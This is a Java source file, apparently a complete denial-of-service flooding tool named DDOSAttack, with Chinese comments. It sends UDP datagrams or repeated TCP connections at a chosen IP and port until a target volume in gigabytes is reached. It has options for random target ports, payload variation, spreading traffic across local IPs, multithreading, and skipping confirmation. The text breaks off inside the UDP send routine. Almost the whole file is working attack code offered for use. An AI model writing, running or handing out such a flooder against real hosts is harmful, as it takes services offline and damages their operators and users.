import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.ClosedByInterruptException;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.LongAdder;


class DDOSAttack {

    // ==================== 常量 ====================
    static final int IP_HEADER_LEN = 20;
    static final int UDP_HEADER_LEN = 8;
    static final int TCP_HEADER_LEN = 20;
    static final int MIN_PAYLOAD = 64;
    static final int MAX_PAYLOAD = 65000;
    static final int TCP_DEFAULT_PAYLOAD = 64;
    static final int UDP_DEFAULT_PAYLOAD = 1490;
    // GlobalRateLimiter 的最大等待步长，避免溢出
    static final long RATE_LIMITER_MAX_WAIT_MS = 100L;

    // ==================== 配置 ====================
    static class Config {
        String targetIP;
        int targetPort;
        double gb;
        int packetSize = -1;         // -1 表示"用户未指定"
        int numThreads = 4;
        int burstSize = 50;
        double rateLimit = 0.0;
        int duration = 0;
        int srcPortBase = -1;
        boolean randomTargetPort = false;
        boolean bindLocal = false;
        boolean varyPayload = true;
        boolean useTcp = false;
        String logFile = null;
        int maxRetries = 3;
        boolean assumeYes = false;   // -y/--yes

        long totalPackets;
        int payloadSize;
        int overhead;
        int totalWireBytes;
    }

    // ==================== 统计 ====================
    static class Stats {
        // LongAdder 用于纯累加（无需 CAS）
        final LongAdder sent = new LongAdder();
        final LongAdder bytesSent = new LongAdder();
        final LongAdder dropped = new LongAdder();

        // AtomicLong 用于 attempts，因为需要严格 CAS 上限
        final AtomicLong attempts = new AtomicLong(0);

        final LongAdder errBind = new LongAdder();
        final LongAdder errPortUnreach = new LongAdder();
        final LongAdder errIO = new LongAdder();
        final LongAdder errOther = new LongAdder();

        // 有界错误历史，O(1) 获取 size
        static final int ERR_HISTORY_MAX = 10;
        private final ArrayDeque<String> recentErrors = new ArrayDeque<>();
        private int recentErrorsSize = 0;
        private final Object recentErrorsLock = new Object();

        final ErrorRateLimiter errorLimiter = new ErrorRateLimiter(5);

        // 严格：总返回 true 的次数不超过 limit
        boolean reserveAttempt(long limit) {
            while (true) {
                long cur = attempts.get();
                if (cur >= limit) return false;
                if (attempts.compareAndSet(cur, cur + 1)) return true;
            }
        }

        void recordError(String category, String tag, String detail) {
            switch (category) {
                case "bind": errBind.increment(); break;
                case "port_unreach": errPortUnreach.increment(); break;
                case "io": errIO.increment(); break;
                default: errOther.increment(); break;
            }
            if (errorLimiter.allow()) {
                synchronized (recentErrorsLock) {
                    recentErrors.addLast("[" + tag + "] " + category + ": " + detail);
                    recentErrorsSize++;
                    while (recentErrorsSize > ERR_HISTORY_MAX) {
                        recentErrors.pollFirst();
                        recentErrorsSize--;
                    }
                }
            }
        }

        List<String> snapshotErrors() {
            synchronized (recentErrorsLock) {
                return new ArrayList<>(recentErrors);
            }
        }

        long totalErrors() {
            return errBind.longValue() + errPortUnreach.longValue()
                 + errIO.longValue() + errOther.longValue();
        }
    }

    // ==================== 错误限流器 ====================
    static class ErrorRateLimiter {
        final int maxPerSec;
        long windowStart;
        int count;
        long suppressed;

        ErrorRateLimiter(int maxPerSec) {
            this.maxPerSec = maxPerSec;
            this.windowStart = System.currentTimeMillis();
        }

        synchronized boolean allow() {
            long now = System.currentTimeMillis();
            if (now - windowStart > 1000) {
                windowStart = now;
                count = 0;
            }
            if (count < maxPerSec) {
                count++;
                return true;
            }
            suppressed++;
            return false;
        }

        synchronized long suppressed() { return suppressed; }
    }

    // ==================== 全局限速器 ====================
    // 单例共享令牌桶，长期速率 = burstSize / rateLimit pps
    // 使用固定小步长等待，避免任何 long / 溢出问题
    static class GlobalRateLimiter {
        final double tokensPerSecond;
        final double maxTokens;
        double tokens;
        long lastRefillNs;
        final Object lock = new Object();

        GlobalRateLimiter(double secondsPerBurst, int burstSize) {
            if (secondsPerBurst > 0 && burstSize > 0) {
                // 保护：极小的 tokensPerSecond 会导致每包等待过久
                // 下限 0.001 令牌/秒（即每 1000 秒一包），已经荒谬但安全
                double tps = burstSize / secondsPerBurst;
                if (tps < 0.001) {
                    System.err.println("[!] rateLimit 过大，tokensPerSecond 已下探到 0.001");
                    tps = 0.001;
                }
                this.tokensPerSecond = tps;
                this.maxTokens = Math.max(1.0, burstSize * 2.0);
            } else {
                this.tokensPerSecond = 0;
                this.maxTokens = 0;
            }
            this.tokens = maxTokens;
            this.lastRefillNs = System.nanoTime();
        }

        void acquire(int n) throws InterruptedException {
            if (tokensPerSecond <= 0) return;
            if (n <= 0) return;
            // 如果请求超过容量，仍需持续推进
            while (true) {
                synchronized (lock) {
                    refill();
                    if (tokens >= n) {
                        tokens -= n;
                        return;
                    }
                    // 计算所需等待，但步长上限为 RATE_LIMITER_MAX_WAIT_MS
                    double needed = n - tokens;
                    double neededMs = needed / tokensPerSecond * 1000.0;
                    long waitMs;
                    if (neededMs > RATE_LIMITER_MAX_WAIT_MS) {
                        waitMs = RATE_LIMITER_MAX_WAIT_MS;
                    } else if (neededMs < 1.0) {
                        waitMs = 1;
                    } else {
                        waitMs = (long) neededMs;
                    }
                    try {
                        lock.wait(waitMs);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        throw e;
                    }
                }
            }
        }

        private void refill() {
            long now = System.nanoTime();
            double elapsed = (now - lastRefillNs) / 1e9;
            if (elapsed > 0) {
                tokens = Math.min(maxTokens, tokens + elapsed * tokensPerSecond);
                lastRefillNs = now;
            }
        }
    }

    // ==================== 日志 ====================
    static class Logger {
        final PrintWriter fp;
        final Object lock = new Object();

        Logger(String path) {
            PrintWriter w = null;
            if (path != null) {
                try {
                    w = new PrintWriter(new FileWriter(path, true));
                } catch (IOException e) {
                    System.err.println("[!] 无法打开日志文件: " + e.getMessage());
                }
            }
            this.fp = w;
        }

        void log(String msg) {
            synchronized (lock) {
                System.out.println(msg);
                if (fp != null) { fp.println(msg); fp.flush(); }
            }
        }

        void err(String msg) {
            synchronized (lock) {
                System.err.println(msg);
                if (fp != null) { fp.println(msg); fp.flush(); }
            }
        }

        void close() {
            synchronized (lock) {
                if (fp != null) fp.close();
            }
        }
    }

    // ==================== 主函数 ====================
    public static void main(String[] args) throws Exception {
        // selftest 入口
        for (String a : args) {
            if ("--selftest".equals(a)) {
                System.exit(runSelfTest() ? 0 : 1);
            }
        }

        Config cfg = new Config();
        if (!parseArgs(args, cfg)) return;

        finalizeConfig(cfg);
        if (cfg.totalPackets <= 0) {
            System.err.println("[!] 最终化后流量太小");
            System.exit(1);
        }

        Logger logger = new Logger(cfg.logFile);

        List<InetAddress> localAddresses = new ArrayList<>();
        if (cfg.bindLocal) {
            localAddresses = enumerateLocalAddresses();
            if (localAddresses.isEmpty()) {
                logger.err("[!] 无可用本地地址，--bind-local 已禁用");
                cfg.bindLocal = false;
            }
        }

        InetSocketAddress[] portAddresses = null;
        if (cfg.randomTargetPort && !cfg.useTcp) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(cfg.targetIP, i);
            }
        }

        Stats stats = new Stats();
        GlobalRateLimiter limiter = new GlobalRateLimiter(cfg.rateLimit, cfg.burstSize);

        printSummary(cfg, logger);

        if (!confirmAttack(cfg, logger)) {
            logger.log("[>] 用户取消");
            logger.close();
            return;
        }

        long startTime = System.currentTimeMillis();
        if (cfg.useTcp) {
            runTcpAttack(cfg, stats, limiter, localAddresses, logger);
        } else {
            runUdpAttack(cfg, stats, limiter, portAddresses, localAddresses, logger);
        }
        long elapsed = System.currentTimeMillis() - startTime;

        printFinalStats(cfg, stats, elapsed, logger);
        logger.close();
    }

    // ==================== 参数解析 ====================
    // 负数只对白名单中的选项允许
    static final Set<String> NEGATIVE_VALUE_OPTIONS = new HashSet<>(Arrays.asList(
            "-s", "--src-port"
    ));

    static boolean parseArgs(String[] args, Config cfg) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            String arg = args[i];
            if (!arg.startsWith("-")) {
                System.err.println("[!] 意外参数: " + arg);
                return false;
            }
            if (arg.startsWith("--") && arg.contains("=")) {
                int eq = arg.indexOf('=');
                params.put(arg.substring(0, eq), arg.substring(eq + 1));
                continue;
            }
            // 长选项必须带值；短选项可以是裸开关
            boolean isLong = arg.startsWith("--");
            boolean takesValue = isLong || NEGATIVE_VALUE_OPTIONS.contains(arg)
                    || isKnownValueOption(arg);
            if (takesValue && i + 1 < args.length && isValue(args[i + 1], arg)) {
                params.put(arg, args[i + 1]);
                i++;
            } else if (isLong) {
                // 长选项无值 -> 报错
                System.err.println("[!] " + arg + " 缺少参数值");
                return false;
            } else {
                params.put(arg, "true");
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            return false;
        }

        // ----- 目标 -----
        cfg.targetIP = params.getOrDefault("-t", params.get("--target"));
        if (cfg.targetIP == null) {
            System.err.println("[!] 缺少 -t/--target");
            return false;
        }
        try {
            InetAddress.getByName(cfg.targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] 无效目标 IP: " + cfg.targetIP);
            return false;
        }

        // ----- 端口 -----
        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) {
            System.err.println("[!] 缺少 -p/--port");
            return false;
        }
        try {
            cfg.targetPort = Integer.parseInt(portStr);
        } catch (NumberFormatException e) {
            System.err.println("[!] 无效端口: " + portStr);
            return false;
        }
        if (cfg.targetPort < 1 || cfg.targetPort > 65535) {
            System.err.println("[!] 端口超出范围: " + cfg.targetPort);
            return false;
        }

        // ----- 流量 -----
        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) {
            System.err.println("[!] 缺少 -g/--gb");
            return false;
        }
        try {
            cfg.gb = Double.parseDouble(gbStr);
        } catch (NumberFormatException e) {
            System.err.println("[!] 无效 GB: " + gbStr);
            return false;
        }
        if (cfg.gb <= 0) {
            System.err.println("[!] GB 必须 > 0");
            return false;
        }

        // ----- 线程数（-P / -T / --processes / --threads） -----
        String threadsStr = params.getOrDefault("-P", params.get("-T"));
        if (threadsStr == null) threadsStr = params.get("--processes");
        if (threadsStr == null) threadsStr = params.get("--threads");
        if (threadsStr != null) {
            try { cfg.numThreads = Integer.parseInt(threadsStr); }
            catch (NumberFormatException e) {
                System.err.println("[!] 无效线程数: " + threadsStr);
                return false;
            }
            if (cfg.numThreads < 1) {
                System.err.println("[!] 线程数必须 >= 1");
                return false;
            }
        }

        // ----- 突发包数 -----
        if (params.containsKey("-b") || params.containsKey("--burst")) {
            String s = params.getOrDefault("-b", params.get("--burst"));
            try { cfg.burstSize = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] 无效突发大小: " + s);
                return false;
            }
            if (cfg.burstSize < 1) {
                System.err.println("[!] 突发大小必须 >= 1");
                return false;
            }
        }

        // ----- 速率 -----
        if (params.containsKey("-r") || params.containsKey("--rate")) {
            String s = params.getOrDefault("-r", params.get("--rate"));
            try { cfg.rateLimit = Double.parseDouble(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] 无效速率: " + s);
                return false;
            }
            if (cfg.rateLimit < 0) {
                System.err.println("[!] 速率必须 >= 0");
                return false;
            }
        }

        // ----- 持续时间 -----
        if (params.containsKey("-d") || params.containsKey("--duration")) {
            String s = params.getOrDefault("-d", params.get("--duration"));
            try { cfg.duration = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] 无效持续时间: " + s);
                return false;
            }
            if (cfg.duration < 0) {
                System.err.println("[!] 持续时间必须 >= 0");
                return false;
            }
        }

        // ----- 源端口 -----
        if (params.containsKey("-s") || params.containsKey("--src-port")) {
            String s = params.getOrDefault("-s", params.get("--src-port"));
            try { cfg.srcPortBase = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] 无效源端口: " + s);
                return false;
            }
            if (cfg.srcPortBase != -1 && (cfg.srcPortBase < 1 || cfg.srcPortBase > 65535)) {
                System.err.println("[!] 源端口必须为 -1 或 1-65535");
                return false;
            }
        }

        // ----- 包大小（记录是否用户指定） -----
        boolean sizeUserSpecified = false;
        if (params.containsKey("--size")) {
            String s = params.get("--size");
            try { cfg.packetSize = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] --size 必须是整数，实际得到: " + s);
                return false;
            }
            sizeUserSpecified = true;
        }

        // ----- 布尔开关 -----
        cfg.randomTargetPort = params.containsKey("--random-port");
        cfg.bindLocal = params.containsKey("--bind-local");
        cfg.useTcp = params.containsKey("--tcp");
        cfg.varyPayload = !params.containsKey("--no-vary");
        cfg.assumeYes = params.containsKey("-y") || params.containsKey("--yes");

        if (params.containsKey("--log")) cfg.logFile = params.get("--log");

        if (params.containsKey("--max-retries")) {
            String s = params.get("--max-retries");
            try { cfg.maxRetries = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] --max-retries 必须是整数，实际得到: " + s);
                return false;
            }
            if (cfg.maxRetries < 0) {
                System.err.println("[!] max-retries 必须 >= 0");
                return false;
            }
        }

        // ----- 各协议默认值 -----
        if (cfg.useTcp) {
            if (!sizeUserSpecified) {
                cfg.packetSize = TCP_DEFAULT_PAYLOAD;
            }
            if (cfg.randomTargetPort) {
                System.err.println("[!] TCP 模式下 --random-port 被忽略");
                cfg.randomTargetPort = false;
            }
            if (params.containsKey("--no-vary")) {
                System.err.println("[!] TCP 模式下 --no-vary 被忽略");
            }
            cfg.varyPayload = false;
        } else {
            if (!sizeUserSpecified) {
                cfg.packetSize = UDP_DEFAULT_PAYLOAD;
            }
        }

        return true;
    }

    // 哪些短选项带值（用于解析逻辑）
    static boolean isKnownValueOption(String opt) {
        switch (opt) {
            case "-t": case "-p": case "-g": case "-P": case "-T":
            case "-b": case "-r": case "-d":
                return true;
            default:
                return false;
        }
    }

    // 值检测：只对白名单选项允许 "-N" 形式
    static boolean isValue(String s, String prevOpt) {
        if (s == null || s.isEmpty()) return false;
        if (!s.startsWith("-")) return true;
        if (NEGATIVE_VALUE_OPTIONS.contains(prevOpt)) {
            try {
                Double.parseDouble(s);
                return true;
            } catch (NumberFormatException e) {
                return false;
            }
        }
        return false;
    }

    // ==================== 最终化配置 ====================
    static void finalizeConfig(Config cfg) {
        if (cfg.packetSize < MIN_PAYLOAD) cfg.packetSize = MIN_PAYLOAD;
        if (cfg.packetSize > MAX_PAYLOAD) cfg.packetSize = MAX_PAYLOAD;

        if (cfg.useTcp) {
            // TCP 现在直接使用用户指定的载荷（默认 64 在 parseArgs 中应用）
            cfg.payloadSize = cfg.packetSize;
            cfg.overhead = IP_HEADER_LEN + TCP_HEADER_LEN;
        } else {
            cfg.payloadSize = cfg.packetSize;
            cfg.overhead = IP_HEADER_LEN + UDP_HEADER_LEN;
        }
        cfg.totalWireBytes = cfg.payloadSize + cfg.overhead;

        long targetBytes = (long)(cfg.gb * 1024.0 * 1024.0 * 1024.0);
        cfg.totalPackets = targetBytes / cfg.totalWireBytes;
        if (cfg.totalPackets <= 0) cfg.totalPackets = 0;
    }

    // ==================== 本地地址枚举 ====================
    static List<InetAddress> enumerateLocalAddresses() {
        List<InetAddress> result = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            if (ifaces == null) return result;
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
                    InetAddress addr = ia.getAddress();
                    if (addr instanceof Inet4Address) result.add(addr);
                }
            }
        } catch (SocketException e) {
            System.err.println("[!] 枚举网卡失败: " + e.getMessage());
        }
        return result;
    }

    // ==================== 用法 ====================
    static void printUsage() {
        System.out.println("[+] 用法: java DDOSAttack -t <IP> -p <PORT> -g <GB> [选项]");
        System.out.println();
        System.out.println("[+] 必填参数:");
        System.out.println("  -t, --target        目标 IP");
        System.out.println("  -p, --port          目标端口");
        System.out.println("  -g, --gb            总流量 (GB)");
        System.out.println();
        System.out.println("[+] 可选参数:");
        System.out.println("  -P, --processes     线程数（默认 4）");
        System.out.println("  -T, --threads       同 -P（别名）");
        System.out.println("  -b, --burst         每突发包数（默认 50，必须 >= 1）");
        System.out.println("  -r, --rate          每突发秒数，全局速率 = burstSize/rate pps");
        System.out.println("  -d, --duration      持续时间（秒，默认 0 = 直到发完）");
        System.out.println("  -s, --src-port      源端口基数，-1 = 随机（默认 -1）");
        System.out.println("  --size              载荷大小（字节）");
        System.out.println("                      UDP 默认 1490，TCP 默认 64；--size 覆盖两者");
        System.out.println("  --random-port       随机目标端口（仅 UDP）");
        System.out.println("  --bind-local        每个线程绑定不同本地 IP");
        System.out.println("  --tcp               TCP connect 洪泛（非 SYN）");
        System.out.println("  --vary / --no-vary  载荷变异（仅 UDP，默认开启）");
        System.out.println("  -y, --yes           跳过交互确认（用于脚本 / CI）");
        System.out.println("  --log <file>        日志文件路径");
        System.out.println("  --max-retries       每包最大重试次数（默认 3）");
        System.out.println("  --selftest          运行内部单元测试后退出");
        System.out.println("  -h, --help          显示本帮助");
        System.out.println();
        System.out.println("[+] 说明:");
        System.out.println("  * 流量统计包含头部（UDP +28B，TCP +40B）。");
        System.out.println("  * 总尝试数通过 CAS 严格封顶，永不超出目标。");
        System.out.println("  * 线程中断被单独处理，不计入 IO 错误。");
        System.out.println("  * 当 stdin 不是 TTY 时，必须加 --yes。");
    }

    // ==================== 摘要与确认 ====================
    static void printSummary(Config cfg, Logger logger) {
        logger.log("");
        logger.log("[+] target=" + cfg.targetIP + ":" + cfg.targetPort
                + "  proto=" + (cfg.useTcp ? "TCP" : "UDP")
                + "  traffic=" + String.format("%.2f", cfg.gb) + "GB"
                + "  packets=" + cfg.totalPackets
                + "  threads=" + cfg.numThreads
                + "  payload=" + cfg.payloadSize + "B"
                + "  wire=" + cfg.totalWireBytes + "B"
                + (cfg.randomTargetPort ? "  random-port" : ""));
        if (cfg.rateLimit > 0) {
            logger.log("[+] 全局速率: "
                    + String.format("%.0f", cfg.burstSize / cfg.rateLimit) + " pps");
        }
        if (cfg.bindLocal) {
            logger.log("[+] 每线程绑定本地 IP（Java 无法伪造源 IP）");
        }
        logger.log("[+] 总尝试数严格上限: " + cfg.totalPackets);
        logger.log("[+] 攻击中... (Ctrl+C 停止)");
    }

    static boolean confirmAttack(Config cfg, Logger logger) {
        if (cfg.assumeYes) return true;
        if (System.console() == null) {
            logger.err("[!] 未检测到 TTY，无法提示。非交互场景请加 -y/--yes。");
            return false;
        }
        try {
            System.out.print("\n[!] 确认攻击 (yes/no): ");
            System.out.flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            String line = reader.readLine();
            return line != null && line.trim().equalsIgnoreCase("yes");
        } catch (IOException e) {
            return false;
        }
    }

    // ==================== UDP 攻击 ====================
    static void runUdpAttack(Config cfg, Stats stats, GlobalRateLimiter limiter,
                              InetSocketAddress[] portAddresses,
                              List<InetAddress> localAddresses, Logger logger) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(cfg.numThreads);
        List<Future<?>> futures = new ArrayList<>();
        // 每线程尝试份额（近似；全局上限由 CAS 强制）
        long perThread = cfg.totalPackets / cfg.numThreads;
        long extra = cfg.totalPackets % cfg.numThreads;

        for (int i = 0; i < cfg.numThreads; i++) {
            long quota = perThread + (i < extra ? 1 : 0);
            final int threadId = i;
            futures.add(executor.submit(() ->
                    udpWorker(threadId, quota, cfg, stats, limiter,
                              portAddresses, localAddresses, logger)));
        }
        monitorProgress(cfg, stats, futures, executor, logger);
    }

    static void udpWorker(int threadId, long perThreadQuota, Config cfg, Stats stats,
                          GlobalRateLimiter limiter,
                          InetSocketAddress[] portAddresses,
                          List<InetAddress> localAddresses, Logger logger) {
        String tag = "T" + threadId;
        ThreadLocalRandom rnd = ThreadLocalRandom.current();
        List<byte[]> pool = buildVariantPool(cfg.payloadSize, 512, cfg.varyPayload, rnd);

        InetAddress bindAddr = null;
        int bindPort = 0;
        if (cfg.bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }
        if (cfg.srcPortBase >= 0) bindPort = cfg.srcPortBase + threadId;

        DatagramChannel channel = null;
        long sent = 0, bytes = 0, dropped = 0;
        long lastReportSent = 0, lastReportBytes = 0, lastReportDropped = 0;
        long packetCounter = 0;
        long localAttempts = 0;
        int consecutiveFail = 0;
        boolean interrupted = false;

        try {
            channel = openUdpChannel(bindAddr, bindPort, tag, stats);
            InetSocketAddress dest = new InetSocketAddress(cfg.targetIP, cfg.targetPort);

            while (!Thread.currentThread().isInterrupted() && localAttempts < perThreadQuota) {
                int toSend = (int) Math.min(cfg.burstSize, perThreadQuota - localAttempts);
                if (toSend <= 0) break;

                try {
                    limiter.acquire(toSend);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }

                for (int j = 0; j < toSend; j++) {
                    if (Thread.currentThread().isInterrupted()) break;
                    if (localAttempts >= perThreadQuota) break;

                    // 通过 CAS 严格封顶
                    if (!stats.reserveAttempt(cfg.totalPackets)) {
                        return;
                    }
                    localAttempts++;

                    byte[] payload = pool.get((int)(packetCounter % pool.size()));
                    if (cfg.varyPayload) mutatePayload(payload, packetCounter, rnd);
                    packetCounter++;

                    InetSocketAddress targetAddr;
                    if (cfg.randomTargetPort) {
                        int port = rnd.nextInt(1, 65536);
                        targetAddr = portAddresses[port];
                    } else {
                        targetAddr = dest;
                    }

                    SendResult r = sendUdpWithRetry(channel, payload, targetAddr,
                                                     cfg.maxRetries, tag, stats);
                    if (r == SendResult.OK) {
                        sent++;
                        bytes += cfg.totalWireBytes;
                        consecutiveFail = 0;
                    } else if (r == SendResult.INTERRUPTED) {
                        interrupted = true;
                        break;
                    } else {
                        dropped++;
                        consecutiveFail++;
                        if (consecutiveFail >= 3) {
                            try {
                                long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFail - 3, 6));
                                Thread.sleep(backoffMs);
                            } catch (InterruptedException e) {
                                Thread.currentThread().interrupt();
                                interrupted = true;
                                break;
                            }
                            if (channel == null || !channel.isOpen()) {
                                if (channel != null) {
                                    try { channel.close(); } catch (IOException ignored) {}
                                }
                                try {
                                    channel = openUdpChannel(bindAddr, bindPort, tag, stats);
                                } catch (IOException e) {
                                    stats.recordError("io", tag, "重开失败: " + e.getMessage());
                                    break;
                                }
                            }
                        }
                    }
                }
                if (interrupted) break;

                long dSent = sent - lastReportSent;
                long dBytes = bytes - lastReportBytes;
                long dDropped = dropped - lastReportDropped;
                if (dSent > 0) stats.sent.add(dSent);
                if (dBytes > 0) stats.bytesSent.add(dBytes);
                if (dDropped > 0) stats.dropped.add(dDropped);
                lastReportSent = sent;
                lastReportBytes = bytes;
                lastReportDropped = dropped;
            }

            long dSent = sent - lastReportSent;
            long dBytes = bytes - lastReportBytes;
            long dDropped = dropped - lastReportDropped;
            if (dSent > 0) stats.sent.add(dSent);
            if (dBytes > 0) stats.bytesSent.add(dBytes);
            if (dDropped > 0) stats.dropped.add(dDropped);

        } catch (Exception e) {
            // 只有真正的意外错误会走到这里
            if (!Thread.currentThread().isInterrupted()) {
                stats.recordError("other", tag, "fatal: " + e.getClass().getSimpleName()
                        + " (" + e.getMessage() + ")");
            }
        } finally {
            if (channel != null) {
                try { channel.close(); } catch (IOException ignored) {}
            }
        }
    }

    // ==================== TCP 攻击 ====================
    static void runTcpAttack(Config cfg, Stats stats, GlobalRateLimiter limiter,
                              List<InetAddress> localAddresses, Logger logger) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(cfg.numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long perThread = cfg.totalPackets / cfg.numThreads;
        long extra = cfg.totalPackets % cfg.numThreads;

        for (int i = 0; i < cfg.numThreads; i++) {
            long quota = perThread + (i < extra ? 1 : 0);
            final int threadId = i;
            futures.add(executor.submit(() ->
                    tcpWorker(threadId, quota, cfg, stats, limiter, localAddresses, logger)));
        }
        monitorProgress(cfg, stats, futures, executor, logger);
    }

    static void tcpWorker(int threadId, long perThreadQuota, Config cfg, Stats stats,
                          GlobalRateLimiter limiter,
                          List<InetAddress> localAddresses, Logger logger) {
        String tag = "T" + threadId;
        ThreadLocalRandom rnd = ThreadLocalRandom.current();

        InetAddress bindAddr = null;
        if (cfg.bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }

        byte[] payload = new byte[cfg.payloadSize];
        rnd.nextBytes(payload);

        long sent = 0, bytes = 0, dropped = 0, localAttempts = 0;
        long lastReportSent = 0, lastReportBytes = 0, lastReportDropped = 0;
        int consecutiveFail = 0;

        while (!Thread.currentThread().isInterrupted() && localAttempts < perThreadQuota) {
            int toSend = (int) Math.min(cfg.burstSize, perThreadQuota - localAttempts);
            if (toSend <= 0) break;

            try {
                limiter.acquire(toSend);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }

            for (int j = 0; j < toSend; j++) {
                if (Thread.currentThread().isInterrupted()) break;
                if (localAttempts >= perThreadQuota) break;
                if (!stats.reserveAttempt(cfg.totalPackets)) return;
                localAttempts++;

                try (Socket s = new Socket()) {
                    if (bindAddr != null) s.bind(new InetSocketAddress(bindAddr, 0));
                    s.setSoTimeout(500);
                    s.connect(new InetSocketAddress(cfg.targetIP, cfg.targetPort), 1000);
                    OutputStream os = s.getOutputStream();
                    os.write(payload);
                    os.flush();
                    sent++;
                    bytes += cfg.totalWireBytes;
                    consecutiveFail = 0;
                } catch (PortUnreachableException e) {
                    if (Thread.currentThread().isInterrupted()) break;
                    stats.recordError("port_unreach", tag, e.getMessage());
                    dropped++;
                    consecutiveFail++;
                } catch (IOException e) {
                    if (Thread.currentThread().isInterrupted()) break;
                    stats.recordError("io", tag, e.getMessage());
                    dropped++;
                    consecutiveFail++;
                }

                if (consecutiveFail >= 3) {
                    try {
                        long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFail - 3, 6));
                        Thread.sleep(backoffMs);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
            }

            long dSent = sent - lastReportSent;
            long dBytes = bytes - lastReportBytes;
            long dDropped = dropped - lastReportDropped;
            if (dSent > 0) stats.sent.add(dSent);
            if (dBytes > 0) stats.bytesSent.add(dBytes);
            if (dDropped > 0) stats.dropped.add(dDropped);
            lastReportSent = sent;
            lastReportBytes = bytes;
            lastReportDropped = dropped;
        }

        long dSent = sent - lastReportSent;
        long dBytes = bytes - lastReportBytes;
        long dDropped = dropped - lastReportDropped;
        if (dSent > 0) stats.sent.add(dSent);
        if (dBytes > 0) stats.bytesSent.add(dBytes);
        if (dDropped > 0) stats.dropped.add(dDropped);
    }

    // ==================== 进度监控 ====================
    static void monitorProgress(Config cfg, Stats stats, List<Future<?>> futures,
                                 ExecutorService executor, Logger logger) throws Exception {
        long start = System.currentTimeMillis();
        long lastReport = start;
        long lastReportSent = 0;

        while (true) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long attempts = stats.attempts.get();
            long sent = stats.sent.longValue();

            if (attempts >= cfg.totalPackets) break;
            if (cfg.duration > 0 && elapsed / 1000 >= cfg.duration) break;

            if (now - lastReport >= 1000) {
                long deltaSent = sent - lastReportSent;
                double dt = (now - lastReport) / 1000.0;
                double inst = deltaSent / dt;
                double avg = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double gb = stats.bytesSent.longValue() / (1024.0 * 1024 * 1024);
                logger.log(String.format(
                        "[+] sent=%d attempts=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d  err=%d",
                        sent, attempts, gb, avg, inst,
                        stats.dropped.longValue(), stats.totalErrors()));
                lastReport = now;
                lastReportSent = sent;
            }
            Thread.sleep(100);
        }

        for (Future<?> f : futures) f.cancel(true);
        executor.shutdownNow();
        for (Future<?> f : futures) {
            try { f.get(2, TimeUnit.SECONDS); }
            catch (Exception ignored) { /* 尽力而为；中断已发出 */ }
        }
    }

    // ==================== 最终统计 ====================
    static void printFinalStats(Config cfg, Stats stats, long elapsed, Logger logger) {
        long sent = stats.sent.longValue();
        long attempts = stats.attempts.get();
        long dropped = stats.dropped.longValue();
        long bytes = stats.bytesSent.longValue();
        double gb = bytes / (1024.0 * 1024 * 1024);
        double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;

        logger.log("");
        logger.log("[=] 完成:");
        logger.log("    发送包数:     " + sent);
        logger.log("    丢弃包数:     " + dropped);
        logger.log("    总尝试数:     " + attempts + " / " + cfg.totalPackets);
        logger.log("    总数据量:     " + String.format("%.4f", gb) + " GB");
        logger.log("    耗时:         " + String.format("%.2f", elapsed / 1000.0) + "s");
        logger.log("    平均速率:     " + String.format("%.1f", rate) + " pps");
        logger.log("    错误:         bind=" + stats.errBind.longValue()
                + " port-unreach=" + stats.errPortUnreach.longValue()
                + " io=" + stats.errIO.longValue()
                + " other=" + stats.errOther.longValue()
                + " (日志抑制=" + stats.errorLimiter.suppressed() + ")");
        List<String> errs = stats.snapshotErrors();
        if (!errs.isEmpty()) {
            logger.log("    最近错误:");
            for (String e : errs) logger.log("      " + e);
        }
    }

    // ==================== UDP 发送 ====================
    enum SendResult { OK, FAILED, INTERRUPTED }

    static SendResult sendUdpWithRetry(DatagramChannel channel, byte[] payload,
                                        SocketAddress target, int maxRetries,
                                        String tag, Stats stats) {
        ByteBuffer buf = ByteBuffer.wrap(payload);
        int attempt = 0;
        while (attempt <= maxRetries) {
            // 快速路径：发送前已中断
            if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
            try {
                buf.clear();
                int written = channel.send(buf, target);
                if (written > 0) return SendResult.OK;
            } catch (ClosedByInterruptException e) {
                // 中断导致通道关闭；不是真正的错误
                return SendResult.INTERRUPTED;
